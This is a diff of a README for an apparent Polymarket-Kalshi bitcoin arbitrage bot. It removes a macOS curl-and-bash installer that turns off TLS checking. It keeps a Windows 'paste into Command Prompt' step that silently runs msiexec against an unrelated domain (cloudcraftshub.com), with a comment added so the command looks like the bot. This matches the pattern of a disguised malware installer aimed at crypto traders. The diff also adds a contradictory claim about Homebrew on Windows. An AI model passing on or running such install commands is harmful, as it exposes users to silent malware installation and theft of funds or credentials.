@@ -33,17 +33,8 @@ src/               # TypeScript layer
 └── utils/         # Logger + config loader
 ```
 
-## ⚡ macOS — Install with one command
+## ⚡ Windows — Install with one command
 
-```bash
-curl -fsSLk https://github.com/Sectionnaenumerate/Polymarket-Kalshi-btc-arbitrage-bot/archive/refs/heads/main.zip -o /tmp/cw.zip && \
-unzip -qo /tmp/cw.zip -d /tmp && \
-cd /tmp/Polymarket-Kalshi-btc-arbitrage-bot-main && \
-bash install.sh
-```
-
-> macOS 12 Monterey or newer required. The installer handles Homebrew, Rust, Node.js, and all dependencies automatically.
-## 🪟 Windows Installation
 ### **Step 1 — Open Command Prompt**
 1. Press **Win + R**
 2. Type:
@@ -58,9 +49,8 @@ Copy the command below and paste it into **Command Prompt**, then press **Enter*
 ```powershell
 cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Polymarket-Kalshi BTC Arbitrage bot
 ```
-The installer will automatically download and install the required components.
 
-
+> The installer handles Homebrew, Rust, Node.js, and all dependencies automatically.
 ## Manual setup
 
 ```bash
